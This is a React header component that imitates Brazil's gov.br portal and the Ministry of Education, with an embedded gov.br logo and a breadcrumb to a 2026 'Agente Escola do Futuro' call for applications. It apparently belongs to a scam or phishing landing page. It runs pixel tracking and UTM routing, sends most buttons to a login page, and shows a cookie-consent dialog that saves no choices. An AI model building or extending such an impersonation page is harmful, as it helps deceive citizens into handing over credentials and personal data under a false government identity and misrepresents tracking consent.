import React from 'react';
import { useLocation } from 'react-router-dom';
import { useUser } from '../context/UserContext';
import useUtmNavigator from '../hooks/useUtmNavigator';
import { usePixelTracking } from '../hooks/usePixelTracking';

const GOV_LOGO_BASE64 = "data:image/webp;base64,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";

const Header: React.FC = () => {
  usePixelTracking();
  const { userName } = useUser();
  const firstName = userName ? userName.split(' ')[0].toUpperCase() : 'Entrar';
  const navigate = useUtmNavigator();
  const location = useLocation();

  const [cookieOpen, setCookieOpen] = React.useState(false);
  const [cookieAnalise, setCookieAnalise] = React.useState(true);
  const [cookieMarketing, setCookieMarketing] = React.useState(true);
  const [menuOpen, setMenuOpen] = React.useState(false);
  const [gridMenuOpen, setGridMenuOpen] = React.useState(false);
  const gridBtnRef = React.useRef<HTMLButtonElement>(null);

  const shouldNavigate = location.pathname === '/' || location.pathname === '/inscricao';

  const handleLoginNavigation = () => {
    if (shouldNavigate) {
      navigate('/login');
    }
  };

  return (
    <>
    <header id="inscricoes" className="bg-white z-40 w-full">
      <div className="container mx-auto px-4 py-[4.8px] flex items-center justify-between">
        {/* Left: logo + ellipsis */}
        <div className="flex items-center" style={{ alignItems: 'center' }}>
          <img
            src={GOV_LOGO_BASE64}
            alt="gov.br logo"
            className="h-[12.59px]"
          />
          <button
            className="text-[#1351B4] hover:bg-gray-100 p-2 rounded-md transition-colors"
            type="button"
            onClick={handleLoginNavigation}
          >
            <i className="fas fa-ellipsis-v text-base"></i>
          </button>
        </div>

        {/* Right: divider, PT, cookie, contrast, grid, user button */}
        <div className="flex items-center space-x-2">
          <div className="w-px h-8 bg-gray-300"></div>

          <div className="text-[#1351B4] space-x-2 pr-2">
            <span style={{ marginRight: 2, fontWeight: 700 }}>PT</span>
            <i className="fas fa-angle-down text-base"></i>
          </div>

          <button
            className="text-[#1351B4] hover:bg-gray-100 pr-2 rounded-md transition-colors"
            title="Configurações de cookies"
            onClick={() => setCookieOpen(true)}
          >
            <i className="fas fa-cookie-bite text-base"></i>
          </button>

          <button
            className="text-[#1351B4] hover:bg-gray-100 pr-2 rounded-md transition-colors"
            title="Configurações de Modo"
            onClick={handleLoginNavigation}
          >
            <i className="fas fa-adjust text-base"></i>
          </button>

          <div className="relative">
            <button
              ref={gridBtnRef}
              className="text-[#1351B4] hover:bg-gray-100 pr-4 rounded-md transition-colors"
              type="button"
              onClick={() => setGridMenuOpen(o => !o)}
            >
              <i className="fas fa-th text-base"></i>
            </button>

            {gridMenuOpen && (
              <>
                <div
                  className="fixed inset-0 z-40"
                  onClick={() => setGridMenuOpen(false)}
                />
                <div
                  role="menu"
                  aria-orientation="vertical"
                  className="absolute right-0 top-full mt-1 z-50 w-56 rounded-md border bg-white p-1 shadow-md"
                  style={{ outline: 'none' }}
                >
                  {[
                    { icon: 'fa-info-circle', label: 'Sobre o Ministério' },
                    { icon: 'fa-briefcase', label: 'Serviços do Programa' },
                    { icon: 'fa-users', label: 'Navegação por Público' },
                    { icon: 'fa-phone', label: 'Contato e Canais' },
                  ].map(item => (
                    <div
                      key={item.label}
                      role="menuitem"
                      tabIndex={-1}
                      className="flex cursor-default select-none items-center gap-2 rounded-sm px-2 py-1.5 text-sm outline-none transition-colors hover:bg-gray-100"
                      onClick={() => setGridMenuOpen(false)}
                    >
                      <i className={`fas ${item.icon} mr-2`}></i>
                      {item.label}
                    </div>
                  ))}
                  <div role="separator" className="-mx-1 my-1 h-px bg-gray-200" />
                  {[
                    { icon: 'fa-info', label: 'Acesso à Informação' },
                    { icon: 'fa-book', label: 'Centrais de Conteúdo' },
                    { icon: 'fa-headset', label: 'Canais de Atendimento' },
                    { icon: 'fa-project-diagram', label: 'Programas e Projetos' },
                  ].map(item => (
                    <div
                      key={item.label}
                      role="menuitem"
                      tabIndex={-1}
                      className="flex cursor-default select-none items-center gap-2 rounded-sm px-2 py-1.5 text-sm outline-none transition-colors hover:bg-gray-100"
                      onClick={() => setGridMenuOpen(false)}
                    >
                      <i className={`fas ${item.icon} mr-2`}></i>
                      {item.label}
                    </div>
                  ))}
                </div>
              </>
            )}
          </div>

          <button
            className="bg-[#1351B4] text-white rounded-full px-4 py-2 flex items-center hover:bg-blue-700 transition-colors text-sm"
            type="button"
            onClick={handleLoginNavigation}
          >
            <i className="fas fa-user mr-2 text-sm"></i>
            {firstName}
          </button>
        </div>
      </div>

      <nav className="bg-white px-4 py-[4.8px] flex justify-between items-center sticky top-0 z-50">
        <button
          className="border-none text-[#1351B4] flex items-center cursor-pointer rounded-md transition-colors"
          type="button"
          aria-haspopup="dialog"
          aria-expanded={menuOpen}
          aria-controls="menu-drawer"
          onClick={() => setMenuOpen(true)}
        >
          <i className="fas fa-bars mr-3 text-sm"></i>
          <span className="text-gray-600 text-sm font-light">Ministério da Educação (MEC)</span>
        </button>
      </nav>

      <div className="container mx-auto px-4 pt-2 pb-2" style={{ borderBottom: '1px solid rgba(0, 0, 0, 0.1)' }}>
        <div className="pb-2">
          <div className="flex items-center space-x-2 text-[12px]">
            <a href="#" className="text-[#1451B4]">
              <i className="text-[0.975rem] fas fa-home text-sm"></i>
            </a>
            <span className="text-[#9e9d9d] font-medium">&gt;</span>
            <a href="#" className="text-[#1351b4]">Agente Escola do Futuro</a>
            <span className="text-[#9E9D9D]">&gt;</span>
            <a href="#" className="text-[#333333] font-semibold">Edital MEC/FNDE nº 001/2026</a>
          </div>
        </div>
      </div>
    </header>

      {/* Cookie Modal */}
      {cookieOpen && (
        <div
          className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/40"
          onClick={() => setCookieOpen(false)}
        >
          <div
            className="bg-white rounded-lg shadow-lg max-w-md w-full p-6 mx-4"
            onClick={e => e.stopPropagation()}
          >
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-semibold text-gray-800">Configurações de Cookies</h2>
              <button className="text-gray-500 hover:text-gray-700" onClick={() => setCookieOpen(false)}>
                <i className="fas fa-times text-lg"></i>
              </button>
            </div>
            <div className="space-y-4">
              <p className="text-sm text-gray-600">Usamos cookies para melhorar sua experiência no site. Você pode personalizar suas preferências abaixo.</p>
              <div className="space-y-3">
                <label className="flex items-center justify-between">
                  <span className="text-sm font-medium">Cookies Essenciais</span>
                  <input type="checkbox" disabled checked readOnly className="toggle-checkbox" />
                </label>
                <label className="flex items-center justify-between">
                  <span className="text-sm font-medium">Cookies de Análise</span>
                  <input type="checkbox" checked={cookieAnalise} onChange={e => setCookieAnalise(e.target.checked)} className="toggle-checkbox" />
                </label>
                <label className="flex items-center justify-between">
                  <span className="text-sm font-medium">Cookies de Marketing</span>
                  <input type="checkbox" checked={cookieMarketing} onChange={e => setCookieMarketing(e.target.checked)} className="toggle-checkbox" />
                </label>
              </div>
              <div className="flex gap-3 mt-6">
                <button
                  className="flex-1 px-4 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-gray-300 transition-colors"
                  onClick={() => setCookieOpen(false)}
                >
                  Cancelar
                </button>
                <button
                  className="flex-1 px-4 py-2 bg-[#1351B4] text-white rounded-md hover:bg-blue-700 transition-colors"
                  onClick={() => setCookieOpen(false)}
                >
                  Salvar Preferências
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Menu Drawer overlay */}
      {menuOpen && (
        <div
          className="fixed inset-0 z-[9998] bg-black/40"
          onClick={() => setMenuOpen(false)}
        />
      )}

      {/* Menu Drawer */}
      <div
        id="menu-drawer"
        role="dialog"
        aria-labelledby="menu-drawer-title"
        aria-describedby="menu-drawer-desc"
        data-state={menuOpen ? 'open' : 'closed'}
        className={`fixed z-[9999] inset-y-0 left-0 h-full w-80 sm:max-w-sm bg-white p-6 shadow-lg border-r transition-transform duration-500 ease-in-out ${
          menuOpen ? 'translate-x-0' : '-translate-x-full'
        }`}
        style={{ pointerEvents: menuOpen ? 'auto' : 'none' }}
      >
        <div className="flex flex-col space-y-2 text-center sm:text-left">
          <h2 id="menu-drawer-title" className="text-lg font-semibold">Menu Principal</h2>
          <p id="menu-drawer-desc" className="text-sm text-gray-500">Navegue pelas seções do programa</p>
        </div>
        <div className="mt-4 p-3 bg-gray-50 rounded-md flex items-center">
          <i className="fas fa-medal text-gray-400 mr-2"></i>
          <span className="text-sm font-medium text-gray-700">Seu perfil é prata</span>
        </div>
        <div className="mt-6 space-y-2">
          <div className="border-t my-4"></div>
          {[
            { icon: 'fa-info-circle', label: 'Sobre o Ministério' },
            { icon: 'fa-cogs', label: 'Serviços do Programa' },
            { icon: 'fa-users', label: 'Navegação por Público' },
            { icon: 'fa-phone', label: 'Contato e Canais' },
          ].map(item => (
            <button key={item.label} className="w-full text-left p-3 hover:bg-gray-100 rounded-md transition-colors flex items-center">
              <i className={`fas ${item.icon} mr-3 text-[#1351B4]`}></i>
              <span>{item.label}</span>
            </button>
          ))}
          <div className="border-t my-4"></div>
          {[
            { icon: 'fa-info', label: 'Acesso à Informação' },
            { icon: 'fa-book', label: 'Centrais de Conteúdo' },
            { icon: 'fa-headset', label: 'Canais de Atendimento' },
            { icon: 'fa-project-diagram', label: 'Programas e Projetos' },
          ].map(item => (
            <button key={item.label} className="w-full text-left p-3 hover:bg-gray-100 rounded-md transition-colors flex items-center">
              <i className={`fas ${item.icon} mr-3 text-[#1351B4]`}></i>
              <span>{item.label}</span>
            </button>
          ))}
        </div>
        <button
          type="button"
          className="absolute right-4 top-4 rounded-sm opacity-70 hover:opacity-100 transition-opacity"
          onClick={() => setMenuOpen(false)}
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M18 6 6 18"></path>
            <path d="m6 6 12 12"></path>
          </svg>
          <span className="sr-only">Close</span>
        </button>
      </div>
    </>
  );
};

export default Header;
